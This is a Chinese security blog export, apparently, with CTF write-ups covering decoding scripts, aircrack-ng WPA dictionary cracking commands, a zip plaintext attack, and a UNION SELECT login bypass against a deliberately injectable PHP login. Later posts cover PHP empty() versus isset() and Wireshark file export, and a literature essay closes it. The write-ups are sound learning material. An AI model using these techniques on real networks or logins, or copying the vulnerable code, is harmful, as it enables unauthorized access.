class="hljs-keyword">in</span> c:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> c:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> c:<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> c:<br>                    a=<span class="hljs-string">&#x27;flag&#123;www_shiyanbar_com_is_very_good_&#x27;</span>+i+j+k+l+<span class="hljs-string">&#x27;&#125;&#x27;</span><br>                    <span class="hljs-built_in">print</span> a<br>                    Md5=hashlib.md5()<br>                    Md5.update(a)<br>                    Md5_num=Md5.hexdigest()<br>                    <span class="hljs-keyword">if</span> m==Md5_num:<br>                        <span class="hljs-keyword">return</span> a<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    result=compare()<br>    <span class="hljs-built_in">print</span> result              <br></code></pre></td></tr></table></figure><p>要有耐心</p><h2 id="解码磁带"><a href="#解码磁带" class="headerlink" title="解码磁带"></a>解码磁带</h2><p>第一眼看上去像摩尔斯电码，试了一下和北京对不上，后来猜测是二进制，果然是可以的。注意究竟哪个是0哪个是1<br>老规矩，上脚本</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>a=<span class="hljs-selector-attr">[]</span><br>line=f<span class="hljs-selector-class">.readline</span>()<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.append</span>(line)<br>while <span class="hljs-selector-tag">line</span>:<br>    line=f<span class="hljs-selector-class">.readline</span>()<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.append</span>(line)<br>d=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">a</span>:<br>     d+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-selector-tag">i</span>,base=<span class="hljs-number">2</span>))<br>     print d<br></code></pre></td></tr></table></figure><h2 id="有趣的文件"><a href="#有趣的文件" class="headerlink" title="有趣的文件"></a>有趣的文件</h2><p>打不开，于是放进hex编辑器里面发现什么都不是，抱着试试看得心里去百度搜了一下文件头发现，这个头是没有，他的变形倒是有，原来是把两位倒过来了，这个脚本也是看别人的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">revStr</span>(s):<br>    news=<span class="hljs-string">&quot;&quot;</span><br>    for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">4</span>) :<br>        news+=s[i+<span class="hljs-number">2</span>:i+<span class="hljs-number">4</span>]<br>        news+=s[i:i+<span class="hljs-number">2</span>]<br>    return news<br>def <span class="hljs-built_in">foo</span>():<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;funfile&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    s=<span class="hljs-string">&quot;377a&quot;</span><br>    for line in f:<br>        s+=<span class="hljs-built_in">revStr</span>(line.<span class="hljs-built_in">strip</span>()[<span class="hljs-number">8</span>:].<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&quot;&quot;</span>))<br>    print s<br>    fsave=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fun.7z&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>    fsave.<span class="hljs-built_in">write</span>(s.<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    fsave.<span class="hljs-built_in">close</span>()<br>    pass<br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">foo</span>()<br>    print <span class="hljs-string">&#x27;finished&#x27;</span><br></code></pre></td></tr></table></figure><p>生成的文件再放进hex编辑器,不管是什么东西，反正里面有flag</p><h2 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h2><p>这道题也是很有意思，两个文件，一个文件是乱码，让人看上去很懵逼，但是这其实也是经验问题，可疑的乱码的产生往往是异或运算造成的，尝试两个文件的异或</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key2.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key1.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br>n=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-attribute">r</span>=<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">list</span>(a)[i])^<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">list</span>(b)[i])<br>    n+=<span class="hljs-built_in">chr</span>(<span class="hljs-attribute">r</span>)<br>print n<br></code></pre></td></tr></table></figure><h2 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h2><p>这是一道wifi包破解的问题，利用的是kail里面的aircrack-ng,具体的方法如下</p><p>首先是 aircrack-ng **.cap 得到包的信息  bssid  essid</p><p>然后找到一个字典放在和包一起 aircrack-ng -a2 -b “bssid” -w 字典 包   破解其密码</p><p>最后 利用 essid 和password   airdecap-ng -p 密码 -e essid  包  得到里面的传输信息</p><p>得到了一个shipin-dec.cap 然后去包里面寻找答案<br>过滤dns 找到A记录（也就是内容里以A开头的）试几次就得到答案了</p><h2 id="sos"><a href="#sos" class="headerlink" title="sos"></a>sos</h2><p>这道题目用到了我一直不知道怎么用的 binwalk -e sos 得到一个文件夹，里面有着一大堆文件夹，每个文件夹里面又有着一个文件data，每一个文件里有着一个字母，猜测是把文件中所有的字母拼起来组合成一段话，上脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def foo():<br>    <span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;piliang/%d/data&quot;</span><br>    <span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(1,242+1):<br>        <span class="hljs-attribute">f</span>=open(path % i).read()<br>        s+=f<br>    <span class="hljs-built_in">print</span> s<br>    pass<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    foo()<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;ok&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="雌黄出其唇吻"><a href="#雌黄出其唇吻" class="headerlink" title="雌黄出其唇吻"></a>雌黄出其唇吻</h2><p>这道题很有迷惑性，每次出来的东西都不一样。每当web万般无奈之时想到的就是扫目录，结果发现了robots.txt，里面藏着有flag的地址</p><h2 id="BAT公司信息查询系统"><a href="#BAT公司信息查询系统" class="headerlink" title="BAT公司信息查询系统"></a>BAT公司信息查询系统</h2><p>这道题让我知道了原来css里面还能藏着信息，原来从来没有访问css的意识<br>里面有一个图片地址，访问扫描又有一个文件地址，访问又有一个页面。这次里面是一个乱码，这也是一个难题，这个乱码代表什么？怎么才能让他显示成看得懂的东西。应该是编码问题，试着修改浏览器的编码，发现没有用，后来又放到了记事本里面另存为换编码，在记事本里面看还是没有变化，结果拖到hex编辑器里面发现显示出来了。至于为什么我现在也比太清楚，待日后解决。</p><h2 id="sssssssss"><a href="#sssssssss" class="headerlink" title="sssssssss"></a>sssssssss</h2><p>这道题给的又是一个不着边的文件，什么特征都没有，结合之前做过的类似的题目大概有几种可能，一种就是，里面的顺序改了，另一种是异或了，显然这里是第二种，因为第一种文件头搜了一下啥信息都没有。和谁异或的？题目那么多s，就是他了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;misc&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br>p=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(f)):<br>    <span class="hljs-attribute">r</span>=<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">list</span>(f)[i])^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>)<br>    <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.write</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-attribute">r</span>))<br></code></pre></td></tr></table></figure><h2 id="only-one-file"><a href="#only-one-file" class="headerlink" title="only one file"></a>only one file</h2><p>这里面涉及到windows和linux的一些识别文件的区别，Linux似乎是通过文件头去判断一个文件的类型的，只要文件头对了，就会自动被判别为某个类型的文件，并且会自动区别显示。但是windows需要通过后缀来完成区别显示。因此在windows下显示为未知文件，放到Linux下就自动转化成了zip，解压，发现里面还有一大堆文件，其中第一个是图片，但是打不开。联想到刚刚分析的，和题目要求，我们猜测这些文件应该是一张图片分隔成的。那我们就要再拼回去。<br>cat file&#x2F;* &gt; 1.png 得到图片，后面再用专用的工具打开就可以了</p><h2 id="2015RCTF（misc50）"><a href="#2015RCTF（misc50）" class="headerlink" title="2015RCTF（misc50）"></a>2015RCTF（misc50）</h2><p>这题给的是sqlmap的爆破记录，想必是让我们看出flag<br>可怕的是全部是url编码的，百度一下找到了别人写的脚本，批量解码，真的很厉害。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs #coding">from urllib import unquote<br>import linecache<br>def get_urldecode(key):<br>    a= unquote(key)<br>    op_word_txt.write(&quot;%s\n&quot;%a)<br>    return key<br>if __name__==&quot;__main__&quot;:<br>    url_list =  linecache.getlines(&#x27;key.txt&#x27;)<br>    op_word_txt = open(&#x27;jiegou.txt&#x27;,&#x27;a&#x27;)<br>    for x in url_list:<br>        print get_urldecode(x.strip())<br></code></pre></td></tr></table></figure><p>解出来那么就简单了，翻一番找到爆破flag字段的语句，用的是二分法，最后！&#x3D;的就是对应的10进制数字，记录下来转一下字符串就行了，转字符串的脚本在之前已经给过，不再啰嗦。</p><h2 id="女神"><a href="#女神" class="headerlink" title="女神"></a>女神</h2><p>这里面是base64 解码看到了关键词png 知道了是图片，那么只要一句话就可以把它转化成功</p><pre><code class="hljs">open('nvshen.png','wb').write(open('nvshen.txt','rb').read().decode('base64'))</code></pre><h2 id="XDCTF-misc200"><a href="#XDCTF-misc200" class="headerlink" title="XDCTF misc200"></a>XDCTF misc200</h2><p>拿到一个不知道是什么文件，丢到hex编辑器看一下，发现可能和虚拟机有关，但是也发现里面有压缩包，不管他，先用 binwalk -e 试一下，的确得到了好多东西，但是很多都是不能用的，不行，再用foremost 试一下，效果要好得多，得到了一切想要的东西。两个压缩包，一个加密一个不加密，两个压缩包有一样的东西，readme.txt查看md5校验的确是一个，所以明文攻击开始了。把readme.txt再压缩成一个没有密码的压缩包，然后用工具明文攻击就可以了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Iscc 2017 ctf web Simple sqli 详细分析</title>
    <link href="/2017/05/28/sql/"/>
    <url>/2017/05/28/sql/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这道题目的解法并不唯一，但我个人感觉这种方法感觉是最触及核心的，也是见多识广的人应该了解的方法。</p><h2 id="开始实践，细细琢磨"><a href="#开始实践，细细琢磨" class="headerlink" title="开始实践，细细琢磨"></a>开始实践，细细琢磨</h2><p>首先看到的就是这个验证码，<br>substr(md5(captcha), 0, 3)&#x3D;9ef</p><span id="more"></span><p>关键在于他真的很’智能’真的是每次都变，不是闹着玩的<br>大概的意思是他会把captcha这个数据md5，然后取前3位，和等于号后面的值比较，相等就行了，然后好奇capcha到底怎么获得，看了一下元素，发现他是真的有这个参数的<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%871.png" alt="image"></p><p>不管那么多只能写一个脚本爆破md5的值，毕竟不能逆推只能比对，脚本如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import hashlib<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">xrange</span>(<span class="hljs-number">100000</span>):<br>    <span class="hljs-keyword">if</span> hashlib<span class="hljs-selector-class">.md5</span>(<span class="hljs-built_in">str</span>(i))<span class="hljs-selector-class">.hexdigest</span>()<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&#x27;efd&#x27;</span>):<br>        print <span class="hljs-selector-tag">i</span> <br></code></pre></td></tr></table></figure><p>开始注入：</p><p>首先我们尝试最一般的 username&#x3D;admin&amp;password&#x3D;admin&amp;captcha&#x3D;8029<br>报 password error<br>说明似乎用户名被蒙对了<br>换一个随便的用户名  username&#x3D;a&amp;password&#x3D;admin&amp;captcha&#x3D;9612<br>报 username error<br>说明登录验证是分两步进行的，首先是检验用户名是否正确，如果用户名正确那么验证密码正确与否，密码正确那么登陆成功，密码错误登录失败。但是用户名不正确，就不会检验密码，直接登录失败。</p><h2 id="补充1"><a href="#补充1" class="headerlink" title="补充1"></a>补充1</h2><p>php常见的登录验证方式就是两种</p><p>1.select * from foobar where username&#x3D;’’ and password&#x3D;’’<br>查寻语句为真就登陆成功否则登录失败<br>2.select password from foobar where username&#x3D;’’（这个username就是我们输<br>入的值）<br>如果找不到那么用户名错误<br>否则<br>如果查到的密码和输入的password&#x2F;或者是输入的经过md5加密后的值相等那么登陆成功<br>否则输出密码错误<br>我们可以去验证一下是不是属于第二种情况（依据是他是否只select password还是select*）<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%872.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%873.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%874.png" alt="image"></p><p>这里面会报两个password error 因为union select @@version 也在查询到的数据中，他是对查询到的数据一条一条和密码去匹配，结果发现我们的两条数据和输入的密码都不一样，所以会报两个password error<br>我们来本机测试一下<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%875.png" alt="image"></p><p>两条数据清晰可见，union select 很多时候就是用来填充或者引入别的数据到同一个表里<br>那么我们只要用union select 去构造一个数据在存放查询得到的password 的那个表中，也就是上图的5.6.17的位置，再输入我们设定好的password，那样依赖他循环遍历对比的特点，就可以绕过密码登陆成功，我们试一下：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%876.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%877.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%878.png" alt="image"></p><p>咦，怎么回事呢，因为他验证用的是我上面说的另一种方法，把我们输入的值得md5的结果和数据库中的对比，也就是说数据库中存储的全都是md5的值，因此我们修改一下我们的payload<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%879.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%8710.png" alt="image"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BB%95%E8%BF%8711.png" alt="image"></p><p>完全符合我们的猜想，第一个用户名admin的真实密码无法和我们构造的假密码去匹配，所以第一个是错的，然后第二个恰恰使我们构造的假密码，绕过成功！！</p><h2 id="补充2"><a href="#补充2" class="headerlink" title="补充2"></a>补充2</h2><p>登录验证类似于这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername </span>= <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username </span>= <span class="hljs-string">&quot;php&quot;</span>;<br><span class="hljs-variable">$password </span>= <span class="hljs-string">&quot;##############&quot;</span>;<br><span class="hljs-variable">$database </span>= <span class="hljs-string">&quot;php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[user] &amp;&amp; <span class="hljs-variable">$_POST</span>[pass]) &#123;<br>    <span class="hljs-variable">$conn </span>= <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$database</span>);<br>    <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>&#125; <br><span class="hljs-variable">$user </span>= <span class="hljs-variable">$_POST</span>[user];<br><span class="hljs-variable">$pass </span>= <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[pass]);<br><br><span class="hljs-variable">$sql </span>= <span class="hljs-string">&quot;select pw from php where user=&#x27;<span class="hljs-subst">$user</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$query </span>= <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(!<span class="hljs-variable">$query</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$row </span>= <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//echo $row[&quot;pw&quot;];</span><br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>((<span class="hljs-variable">$row</span>[pw]) &amp;&amp; (!<span class="hljs-title function_ invoke__">strcasecmp</span>(<span class="hljs-variable">$pass</span>, <span class="hljs-variable">$row</span>[pw]))) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Logged in! Key: ################################ &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);<br><br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种类型的绕过应该算是比较常见的绕过方式的一种，平时应该多积累，这样才能有所突破，运用起来也会游刃有余。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP empty()与isset()的比较</title>
    <link href="/2017/04/23/empty%E4%B8%8Eisset/"/>
    <url>/2017/04/23/empty%E4%B8%8Eisset/</url>
    
    <content type="html"><![CDATA[<h2 id="一道CTF引起"><a href="#一道CTF引起" class="headerlink" title="一道CTF引起"></a>一道CTF引起</h2><p>今天打CTF无意间发现了我原来没怎么注意过的一些问题，特地拿出来记录一下。<br>一道php代码审计题目如下图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%A2%98%E7%9B%AE1.png" alt="image"></p><span id="more"></span><p>程序员含义是，用get传入参数ac，fn  extract()会直接生成一个ac变量，如果不为空再将fn传入的文件名的文件的内容作为字符串并且去除两边的空格返回给$f,当ac传入的变量和f传入的文件内容完全相等的时候（注意）这里是完全相等，就会返回flag.<br>本题已经知道目录下有一个flag.txt文件内容是flags<br>所以在url里面构造index.php?ac&#x3D;flags&amp;fn&#x3D;flag.txt 可以解决</p><h2 id="后来发现了另一道题"><a href="#后来发现了另一道题" class="headerlink" title="后来发现了另一道题"></a>后来发现了另一道题</h2><p>如下图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%A2%98%E7%9B%AE2.png" alt="image"><br>这道题传入的参数是空，全部是空，回去试一下那道题居然不行，很奇怪，看看题目有什么不同，看到了&#x3D;&#x3D; 和&#x3D;&#x3D;&#x3D;一个是松散比较一个是严格比较，但是第一道题如果是空和空也会返回真啊，一脸懵逼，后来又发现第一道题对第一个参数的判断条件是empty() 第二个题目是isset(),其实这就是问题所在empty()和isset()究竟有什么区别？ </p><h2 id="查查资料"><a href="#查查资料" class="headerlink" title="查查资料"></a>查查资料</h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%B5%84%E6%96%991.png" alt="image"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%B5%84%E6%96%992.png" alt="image"></p><h2 id="自己也写了一个简单的函数测试一下"><a href="#自己也写了一个简单的函数测试一下" class="headerlink" title="自己也写了一个简单的函数测试一下"></a>自己也写了一个简单的函数测试一下</h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%8B%E8%AF%951.png" alt="image"><br>返回you<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%8B%E8%AF%952.png" alt="image"><br>返回kong<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%8B%E8%AF%953.png" alt="image"><br>返回kong<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%8B%E8%AF%954.png" alt="image"><br>返回kong</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>empty 不仅仅检查变量是不是存在，还会检查变量的值。变量不存在，或者变量存在但是值为’假’，就认为是空。<br>isset 只会检查变量是不是存在，变量不存在也就是NULL才认为是空，哪怕是“”也会认为存在。</p>]]></content>
    
    
    <categories>
      
      <category>learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习发现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wireshark导出数据流中文件的正确“姿势”</title>
    <link href="/2017/04/17/wireshark/"/>
    <url>/2017/04/17/wireshark/</url>
    
    <content type="html"><![CDATA[<h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>&emsp;&emsp;在打CTF的过程中难免遇见wireshark导出数据流中的文件的问题，以前一直没有找到正确的“姿势”，都是用追踪数据流，然后直接保存为原始数据，在拖到hexeitor里面改改包，包比较小的时候还好用，包一大，不但找起来不方便，而且包也一直改不对。今天终于找到正确方法，和大家分享一下。</p><span id="more"></span><h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>找到左上角的file菜单，点击选择导出文件类型，我选的是http</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/4.png" alt="image"></p><h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>找到需要提取的文件类型,修改名字（自愿）save as …</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/1.png" alt="image"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/5.png" alt="image"></p><h1 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h1><p>看一下效果怎么样<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/3.png" alt="image"></p><p>哈哈，怎么样，还不错吧。</p><h2 id="本文属原创，转载请注明出处。"><a href="#本文属原创，转载请注明出处。" class="headerlink" title="本文属原创，转载请注明出处。"></a>本文属原创，转载请注明出处。</h2>]]></content>
    
    
    <categories>
      
      <category>wireshark</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随心而动，落笔生花</title>
    <link href="/2017/02/15/%E7%AC%94%E9%9A%8F%E5%BF%83%E5%8A%A8%EF%BC%8C%E8%90%BD%E7%AC%94%E7%94%9F%E8%8A%B1/"/>
    <url>/2017/02/15/%E7%AC%94%E9%9A%8F%E5%BF%83%E5%8A%A8%EF%BC%8C%E8%90%BD%E7%AC%94%E7%94%9F%E8%8A%B1/</url>
    
    <content type="html"><![CDATA[<h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>百无聊赖中，随手拿起桌边的一本杂志，是一本《读者》。再仔细一看，2016年12期，还是高考前买的。不禁心中感慨自从上了大学自己已经多久没有碰过文学类的东西了。翻看着已经成为历史的杂志，那里面的文字依旧带着曾经的温度，我甚至感觉又置身与那段青涩的时光。</p><span id="more"></span><h2 id="文学带给我们的究竟是什么"><a href="#文学带给我们的究竟是什么" class="headerlink" title="文学带给我们的究竟是什么"></a>文学带给我们的究竟是什么</h2><p>文学真的有用吗？我也一直在问我自己。后来我发现，文学带给我们的太多太多，可能文学在理工科生的眼里只不过是一大堆杂七杂八的文字，是娱乐消遣“零食”，或是一道阅读理解题，更或者是一种煎熬，但真正的文学带来的是灵魂的滋养，带给读者的是人生方向的指引，带给读者的是面对问题更多的思考角度，是一个新的世界。仅仅读了一小会儿我就有一种老友相见的感觉，或者是找到了知己，我相信，每一本书中都一定有懂你的人，每一本书中都能找到你自己的影子。所以，虽然是理科生，但也不能对文学嗤之以鼻，也应该适当读一些好的文章，好的书籍。</p><h2 id="分享一篇我很喜欢的文章"><a href="#分享一篇我很喜欢的文章" class="headerlink" title="分享一篇我很喜欢的文章"></a>分享一篇我很喜欢的文章</h2><p>　　　　　　　　　　　　　 　　<strong>生活是一场游戏</strong></p><p>　　想像生活就是一场游戏，在这个游戏中，你向空中抛出五个球。你点着它们的名<br>字：工作，家庭，健康，朋友和心境，而你正在让这些球保持在空中。</p><p>　　